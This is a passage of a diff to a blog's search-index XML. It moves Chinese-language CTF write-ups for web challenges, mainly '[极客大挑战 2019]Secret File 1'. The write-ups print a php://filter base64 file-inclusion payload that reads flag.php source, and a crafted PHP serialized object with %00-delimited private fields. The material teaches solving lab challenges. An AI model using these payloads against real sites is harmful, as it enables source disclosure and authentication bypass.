-alt="image-20211102000144789" />emmm, 跟我想的不一样</p>
-<p>经过一番查找得知:
-<code>Name</code>类的两个属性是<code>private</code>的, 只能在类中访问,
-在序列化后的文本中要用<code>%00</code>将类名和属性名分隔开,
-所以正确的序列化文本应该是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
-<p>再次提交:</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111020005666.png"
-alt="image-20211102000537580" />
-<figcaption aria-hidden="true">image-20211102000537580</figcaption>
-</figure>
-<p>成功拿到<strong>flag</strong></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[极客大挑战 2019]Secret File 1</title>
-    <url>/2021/10/30/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File-1/</url>
-    <content><![CDATA[<p>首先查看源代码,找到入口<code>./Archive_room.php</code><img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301139004.png"
-alt="image-20211030113938928" /></p>
-<p>进入<code>Archiv_room.php</code>, 点击按钮并抓包<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301140021.png"
-alt="image-20211030114045966" /></p>
-<p>可以看到逻辑就是点击按钮服务器指定跳转到<code>end.php</code> ,
-返回的内容中有<code>secr3t.php</code></p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301143534.png"
-alt="image-20211030114309440" />
-<figcaption aria-hidden="true">image-20211030114309440</figcaption>
-</figure>
-<p>进入<code>secr3t.php</code>页面,可见源代码, 有一些过滤,
-但是貌似不影响操作<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301146585.png"
-alt="image-20211030114612553" /></p>
-<p>先试试<code>file=flag.php</code><img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301149401.png"
-alt="image-20211030114947337" /></p>
-<p>显然是不行的, <strong>flag</strong>就在<code>flag.php</code>中,
-但是没有被显示出来我们需要拿到<code>flag.php</code>的源代码才行</p>
-<p>这里采用<strong>php伪协议</strong>, 实现文件包含,
-将源代码文件转换成base64编码显示出来(为什么要用base64编码?因为include引入的文件如果是php文件会被直接执行,
-这样就拿不到源码了, 而如果是非php文件就会被显示出来)</p>
-<p>构造payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301204885.png"
-alt="image-20211030120426834" />
-<figcaption aria-hidden="true">image-20211030120426834</figcaption>
-</figure>
-<p>再把base64编码的源代码解码就可以拿到<strong>flag</strong></p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301205630.png"
-alt="image-20211030120555576" />
-<figcaption aria-hidden="true">image-20211030120555576</figcaption>
-</figure>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -2313,6 +2260,59 @@ alt="image-20211101163731288" />
       <tags>
         <tag>Web安全</tag>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[极客大挑战 2019]Secret File 1</title>
+    <url>/2021/10/30/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File-1/</url>
+    <content><![CDATA[<p>首先查看源代码,找到入口<code>./Archive_room.php</code><img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301139004.png"
+alt="image-20211030113938928" /></p>
+<p>进入<code>Archiv_room.php</code>, 点击按钮并抓包<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301140021.png"
+alt="image-20211030114045966" /></p>
+<p>可以看到逻辑就是点击按钮服务器指定跳转到<code>end.php</code> ,
+返回的内容中有<code>secr3t.php</code></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301143534.png"
+alt="image-20211030114309440" />
+<figcaption aria-hidden="true">image-20211030114309440</figcaption>
+</figure>
+<p>进入<code>secr3t.php</code>页面,可见源代码, 有一些过滤,
+但是貌似不影响操作<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301146585.png"
+alt="image-20211030114612553" /></p>
+<p>先试试<code>file=flag.php</code><img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301149401.png"
+alt="image-20211030114947337" /></p>
+<p>显然是不行的, <strong>flag</strong>就在<code>flag.php</code>中,
+但是没有被显示出来我们需要拿到<code>flag.php</code>的源代码才行</p>
+<p>这里采用<strong>php伪协议</strong>, 实现文件包含,
+将源代码文件转换成base64编码显示出来(为什么要用base64编码?因为include引入的文件如果是php文件会被直接执行,
+这样就拿不到源码了, 而如果是非php文件就会被显示出来)</p>
+<p>构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301204885.png"
+alt="image-20211030120426834" />
+<figcaption aria-hidden="true">image-20211030120426834</figcaption>
+</figure>
+<p>再把base64编码的源代码解码就可以拿到<strong>flag</strong></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301205630.png"
+alt="image-20211030120555576" />
+<figcaption aria-hidden="true">image-20211030120555576</figcaption>
+</figure>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
 </search>
